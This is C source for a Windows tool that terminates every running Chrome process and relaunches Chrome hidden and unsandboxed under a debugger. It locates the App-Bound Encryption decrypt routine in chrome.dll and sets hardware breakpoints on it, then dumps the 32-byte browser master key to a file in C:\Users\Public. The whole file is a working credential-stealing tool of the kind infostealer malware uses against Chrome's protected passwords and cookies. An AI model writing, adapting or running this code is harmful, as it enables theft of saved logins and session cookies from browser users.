#include <windows.h>

#define TH32CS_SNAPPROCESS 0x00000002
#define TH32CS_SNAPTHREAD 0x00000004
#define TH32CS_SNAPMODULE 0x00000008

typedef unsigned char uint8_t;
typedef int int32_t;
BOOL bpv = FALSE;

void *memset(void *dest, int c, size_t count)
{
    unsigned char *p = (unsigned char *)dest;
    while (count--) *p++ = (unsigned char)c;
    return dest;
}

void *memcpy(void *dst, const void *src, unsigned long long count)
{
    char *d = (char *)dst;
    const char *s = (const char *)src;
    while (count--) *d++ = *s++;
    return dst;
}

wchar_t *_wcslwrp(wchar_t *str)
{
    wchar_t *p = str;
    while (*p)
    {
        if (*p >= L'A' && *p <= L'Z') *p = *p + 32;
        p++;
    }
    return str;
}

int strcmp(const char *s1, const char *s2) {
    while (*s1 && (*s1 == *s2)) {
        s1++;
        s2++;
    }
    return *(unsigned char *)s1 - *(unsigned char *)s2;
}

wchar_t *wcsstr(const wchar_t *haystack, const wchar_t *needle)
{
    if (!*needle) return (wchar_t *)haystack;
    while (*haystack)
    {
        const wchar_t *h = haystack;
        const wchar_t *n = needle;
        while (*h && *n && *h == *n) { h++; n++; }
        if (!*n) return (wchar_t *)haystack;
        haystack++;
    }
    return NULL;
}

typedef NTSTATUS(NTAPI *pfnNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);

typedef struct tagPROCESSENTRY32W
{
    DWORD dwSize;
    DWORD cntUsage;
    DWORD th32ProcessID;
    ULONG_PTR th32DefaultHeapID;
    DWORD th32ModuleID;
    DWORD cntThreads;
    DWORD th32ParentProcessID;
    LONG pcPriClassBase;
    DWORD dwFlags;
    WCHAR szExeFile[MAX_PATH];
} PROCESSENTRY32W;

typedef struct tagTHREADENTRY32
{
    DWORD dwSize;
    DWORD cntUsage;
    DWORD th32ThreadID;
    DWORD th32OwnerProcessID;
    LONG tpBasePri;
    LONG tpDeltaPri;
    DWORD dwFlags;
} THREADENTRY32;
typedef THREADENTRY32 *LPTHREADENTRY32;

typedef struct tagMODULEENTRY32W
{
    DWORD dwSize;
    DWORD th32ModuleID;
    DWORD th32ProcessID;
    DWORD GlblcntUsage;
    DWORD ProccntUsage;
    BYTE *modBaseAddr;
    DWORD modBaseSize;
    HMODULE hModule;
    WCHAR szModule[256];
    WCHAR szExePath[MAX_PATH];
} MODULEENTRY32W;

BOOL WINAPI Thread32First(HANDLE, LPTHREADENTRY32);
BOOL WINAPI Thread32Next(HANDLE, LPTHREADENTRY32);
HANDLE WINAPI CreateToolhelp32Snapshot(DWORD, DWORD);
BOOL WINAPI Process32FirstW(HANDLE, PROCESSENTRY32W *);
BOOL WINAPI Process32NextW(HANDLE, PROCESSENTRY32W *);
BOOL WINAPI Module32FirstW(HANDLE, MODULEENTRY32W *);
BOOL WINAPI Module32NextW(HANDLE, MODULEENTRY32W *);

void ArmBreakpoints(DWORD pid, DWORD_PTR target)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return;

    THREADENTRY32 te;
    te.dwSize = sizeof(te);

    if (Thread32First(snap, &te))
    {
        do
        {
            if (te.th32OwnerProcessID == pid)
            {
                HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                if (hThread)
                {
                    SuspendThread(hThread);

                    CONTEXT ctx;
                    memset(&ctx, 0, sizeof(ctx));
                    ctx.ContextFlags = CONTEXT_ALL;

                    if (GetThreadContext(hThread, &ctx))
                    {
                        ctx.Dr0 = target;
                        ctx.Dr7 = 0x00000001;
                        SetThreadContext(hThread, &ctx);

                        CONTEXT verify;
                        memset(&verify, 0, sizeof(verify));
                        verify.ContextFlags = CONTEXT_DEBUG_REGISTERS;

                        if (GetThreadContext(hThread, &verify))
                        {
                            if (verify.Dr0 != target || verify.Dr7 != 0x00000001)
                            {
                                BOOL bpv = TRUE;
                            }
                        }
                    }

                    ResumeThread(hThread);
                    CloseHandle(hThread);

                }
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
}

void WriteDebugLog(const char *msg)
{
    HANDLE hDbg = CreateFileW(L"C:\\Users\\Public\\aob_debug.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDbg != INVALID_HANDLE_VALUE)
    {
        DWORD written;
        WriteFile(hDbg, msg, lstrlenA(msg), &written, NULL);
        CloseHandle(hDbg);
    }
}

uintptr_t FindPatternInRemote(HANDLE hProcess, uintptr_t start, size_t size, const uint8_t *pattern, size_t patternLen)
{
    if (!hProcess || !start || !size || size < patternLen)
        return 0;

    uint8_t *buf = (uint8_t *)LocalAlloc(LPTR, size);
    if (!buf)
        return 0;

    SIZE_T bytesRead = 0;
    if (!ReadProcessMemory(hProcess, (LPCVOID)start, buf, size, &bytesRead) || bytesRead != size)
    {
        LocalFree(buf);
        return 0;
    }

    for (size_t i = 0; i <= size - patternLen; i++)
    {
        BOOL match = TRUE;
        for (size_t j = 0; j < patternLen; j++)
        {
            if (buf[i + j] != pattern[j])
            {
                match = FALSE;
                break;
            }
        }
        if (match)
        {
            LocalFree(buf);
            return start + i;
        }
    }

    LocalFree(buf);
    return 0;
}

uintptr_t FindAppBoundBreakpointAddress(HANDLE hProcess, uintptr_t moduleBase)
{
    WriteDebugLog("AOB start\r\n");
    if (!hProcess || !moduleBase)
    {
        WriteDebugLog("Invalid handle/base\r\n");
        return 0;
    }

    IMAGE_DOS_HEADER dos;
    SIZE_T bytesRead = 0;
    if (!ReadProcessMemory(hProcess, (LPCVOID)moduleBase, &dos, sizeof(dos), &bytesRead) || bytesRead != sizeof(dos))
    {
        WriteDebugLog("Read DOS failed\r\n");
        return 0;
    }
    if (dos.e_magic != IMAGE_DOS_SIGNATURE)
    {
        WriteDebugLog("Bad DOS signature\r\n");
        return 0;
    }

    IMAGE_NT_HEADERS nt;
    if (!ReadProcessMemory(hProcess, (LPCVOID)(moduleBase + dos.e_lfanew), &nt, sizeof(nt), &bytesRead) || bytesRead != sizeof(nt))
    {
        WriteDebugLog("Read NT failed\r\n");
        return 0;
    }
    if (nt.Signature != IMAGE_NT_SIGNATURE)
    {
        WriteDebugLog("Bad NT signature\r\n");
        return 0;
    }

    DWORD sectionCount = nt.FileHeader.NumberOfSections;
    WriteDebugLog("Sections: ");
    char secCountBuf[16];
    wsprintfA(secCountBuf, "%d\r\n", sectionCount);
    WriteDebugLog(secCountBuf);

    IMAGE_SECTION_HEADER sec[128];
    if (sectionCount > 128)
        sectionCount = 128;
    if (!ReadProcessMemory(hProcess, (LPCVOID)(moduleBase + dos.e_lfanew + sizeof(IMAGE_NT_HEADERS)), sec, sizeof(IMAGE_SECTION_HEADER) * sectionCount, &bytesRead) || bytesRead != sizeof(IMAGE_SECTION_HEADER) * sectionCount)
    {
        WriteDebugLog("Read sections failed\r\n");
        return 0;
    }

    const char targetStr[] = "OSCrypt.AppBoundProvider.Decrypt.ResultCode";
    uintptr_t strAddr = 0;

    for (DWORD i = 0; i < sectionCount; i++)
    {
        if (sec[i].Misc.VirtualSize == 0)
            continue;
        strAddr = FindPatternInRemote(hProcess, moduleBase + sec[i].VirtualAddress, sec[i].Misc.VirtualSize, (const uint8_t *)targetStr, sizeof(targetStr) - 1);
        if (strAddr)
        {
            WriteDebugLog("String found at: ");
            char addrBuf[32];
            wsprintfA(addrBuf, "%p\r\n", strAddr);
            WriteDebugLog(addrBuf);
            break;
        }
    }

    if (!strAddr)
    {
        WriteDebugLog("String NOT FOUND\r\n");
        return 0;
    }

    // Find .text section
    uintptr_t textStart = 0;
    size_t textSize = 0;
    for (DWORD i = 0; i < sectionCount; i++)
    {
        if (strncmp((const char *)sec[i].Name, ".text", 8) == 0)
        {
            textStart = moduleBase + sec[i].VirtualAddress;
            textSize = sec[i].Misc.VirtualSize;
            WriteDebugLog(".text start: ");
            char textBuf[32];
            wsprintfA(textBuf, "%p, size: %u\r\n", textStart, textSize);
            WriteDebugLog(textBuf);
            break;
        }
    }

    if (!textStart || !textSize || textSize < 7)
    {
        WriteDebugLog("No .text or too small\r\n");
        return 0;
    }

    // Instead of reading entire .text, we'll read in chunks to avoid huge allocation.
    const size_t chunkSize = 0x100000; // 1 MB
    for (size_t offset = 0; offset < textSize; offset += chunkSize - 7)
    {
        size_t currentChunk = min(chunkSize, textSize - offset);
        uint8_t *buf = (uint8_t *)LocalAlloc(LPTR, currentChunk);
        if (!buf)
            continue;
        SIZE_T read = 0;
        if (!ReadProcessMemory(hProcess, (LPCVOID)(textStart + offset), buf, currentChunk, &read) || read != currentChunk)
        {
            LocalFree(buf);
            continue;
        }

        for (size_t i = 0; i <= currentChunk - 7; i++)
        {
            if (buf[i] == 0x48 && buf[i + 1] == 0x8D && buf[i + 2] == 0x0D)
            {
                uintptr_t instrAddr = textStart + offset + i;
                int32_t disp = *(int32_t *)(buf + i + 3);
                uintptr_t target = instrAddr + 7 + disp;
                if (target == strAddr)
                {
                    WriteDebugLog("Instruction found (LEA)\r\n");
                    LocalFree(buf);
                    return instrAddr;
                }
            }
            else if (buf[i] == 0x48 && buf[i + 1] == 0x8B && buf[i + 2] == 0x0D)
            {
                uintptr_t instrAddr = textStart + offset + i;
                int32_t disp = *(int32_t *)(buf + i + 3);
                uintptr_t target = instrAddr + 7 + disp;
                if (target == strAddr)
                {
                    WriteDebugLog("Instruction found (MOV)\r\n");
                    LocalFree(buf);
                    return instrAddr;
                }
            }
        }
        LocalFree(buf);
    }

    WriteDebugLog("Instruction NOT FOUND\r\n");
    return 0;
}

BOOL TryFindChromeAndArm(HANDLE hProcess, DWORD pid, DWORD_PTR *target, int *phase)
{
    if (*phase != 0)
        return TRUE;

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (snap == INVALID_HANDLE_VALUE)
        return FALSE;

    MODULEENTRY32W me;
    me.dwSize = sizeof(me);

    if (Module32FirstW(snap, &me))
    {
        do
        {
            _wcslwrp(me.szModule);
            _wcslwrp(me.szExePath);

            if (wcsstr(me.szModule, L"chrome.dll") != NULL ||
                wcsstr(me.szExePath, L"chrome.dll") != NULL)
            {
                *target = FindAppBoundBreakpointAddress(hProcess, (uintptr_t)me.modBaseAddr);
                CloseHandle(snap);
                if (*target == 0)
                    return FALSE;
                ArmBreakpoints(pid, *target);
                *phase = 1;
                return TRUE;
            }
        } while (Module32NextW(snap, &me));
    }

    CloseHandle(snap);
    return FALSE;
}

void exc(void)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
        return;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);

    if (Process32FirstW(hSnapshot, &pe))
    {
        do
        {
            if (lstrcmpiW(pe.szExeFile, L"chrome.exe") == 0)
            {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (hProcess)
                {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    Sleep(300);
}

void entry(void)
{
    __asm__ volatile ("andq $-16, %rsp");

    exc();

    PROCESS_INFORMATION pi;
    STARTUPINFOW si;
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    wchar_t path[] = L"\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --no-first-run --no-sandbox --disable-extensions --profile-directory=\"Default\"";

    if (!CreateProcessW(NULL, path, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
        ExitProcess(1);

    if (!DebugActiveProcess(pi.dwProcessId))
    {
        TerminateProcess(pi.hProcess, 0);
        ExitProcess(1);
    }

    BYTE mstkb[32];
    memset(mstkb, 0, sizeof(mstkb));

    DEBUG_EVENT dbgevnt;
    ResumeThread(pi.hThread);

    int currentPhase = 0;
    DWORD_PTR DynamicTargetAddress = 0;
    BOOL needStepOver = FALSE;
    DWORD stepThreadId = 0;

    while (WaitForDebugEvent(&dbgevnt, INFINITE))
    {
        if (currentPhase == 0)
            if (TryFindChromeAndArm(pi.hProcess,pi.dwProcessId, &DynamicTargetAddress, &currentPhase)) {
                
            }

        DWORD cnt = DBG_CONTINUE;

        switch (dbgevnt.dwDebugEventCode)
        {
        case CREATE_THREAD_DEBUG_EVENT:
        {
            if (currentPhase == 1)
            {
                HANDLE hThread = dbgevnt.u.CreateThread.hThread;
                if (hThread)
                {
                    CONTEXT ctx;
                    memset(&ctx, 0, sizeof(ctx));
                    ctx.ContextFlags = CONTEXT_ALL;

                    if (GetThreadContext(hThread, &ctx))
                    {
                        ctx.Dr0 = DynamicTargetAddress;
                        ctx.Dr7 = 0x00000001;
                        SetThreadContext(hThread, &ctx);
                    }
                }
            }
            break;
        }

        case EXCEPTION_DEBUG_EVENT:
        {
            DWORD expCode = dbgevnt.u.Exception.ExceptionRecord.ExceptionCode;

            if (expCode == EXCEPTION_SINGLE_STEP)
            {
                if (needStepOver && dbgevnt.dwThreadId == stepThreadId)
                {
                    needStepOver = FALSE;
                    stepThreadId = 0;

                    HANDLE hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, dbgevnt.dwThreadId);
                    if (hThread)
                    {
                        CONTEXT ctx;
                        memset(&ctx, 0, sizeof(ctx));
                        ctx.ContextFlags = CONTEXT_ALL;

                        if (GetThreadContext(hThread, &ctx))
                        {
                            DWORD_PTR pointerAddress = ctx.R15;
                            DWORD_PTR keyAddress = 0;
                            SIZE_T bytesRead = 0;

                            BOOL rd1 = ReadProcessMemory(pi.hProcess,(LPCVOID)pointerAddress,&keyAddress,sizeof(keyAddress),&bytesRead);

                            if (rd1 && bytesRead == sizeof(keyAddress) && keyAddress != 0)
                            {
                                bytesRead = 0;

                                BOOL rd2 = ReadProcessMemory(pi.hProcess,(LPCVOID)keyAddress,mstkb,sizeof(mstkb),&bytesRead);

                                if (rd2 && bytesRead == sizeof(mstkb))
                                {
                                    HANDLE hFile = CreateFileW(L"C:\\Users\\Public\\mstrk.txt",GENERIC_WRITE, 0, NULL,CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                                    if (hFile != INVALID_HANDLE_VALUE)
                                    {
                                        DWORD written = 0;
                                        WriteFile(hFile, mstkb, sizeof(mstkb), &written, NULL);
                                        MessageBoxW(NULL,L"master key is inside the file",L"OK",MB_OK);
                                        CloseHandle(hFile);
                                    }

                                    TerminateProcess(pi.hProcess, 0);
                                    CloseHandle(hThread);
                                    ExitProcess(0);
                                }
                            }
                        }
                        CloseHandle(hThread);
                    }
                }
                else if ((DWORD_PTR)dbgevnt.u.Exception.ExceptionRecord.ExceptionAddress == DynamicTargetAddress && DynamicTargetAddress != 0)
                {
                    HANDLE hThread = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, dbgevnt.dwThreadId);
                    if (hThread)
                    {
                        CONTEXT ctx;
                        memset(&ctx, 0, sizeof(ctx));
                        ctx.ContextFlags = CONTEXT_CONTROL;

                        if (GetThreadContext(hThread, &ctx))
                        {
                            ctx.EFlags |= 0x100;
                            SetThreadContext(hThread, &ctx);
                            needStepOver = TRUE;
                            stepThreadId = dbgevnt.dwThreadId;
                        }
                        CloseHandle(hThread);
                    }
                }
                cnt = DBG_CONTINUE;
            }
            else if (expCode == 0x80000003)
            {
                cnt = DBG_CONTINUE;
            }
            else
            {
                cnt = DBG_EXCEPTION_NOT_HANDLED;
            }
            break;
        }

        case EXIT_PROCESS_DEBUG_EVENT:
            ExitProcess(0);
            break;
        }

        ContinueDebugEvent(dbgevnt.dwProcessId, dbgevnt.dwThreadId, cnt);
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    ExitProcess(0);
}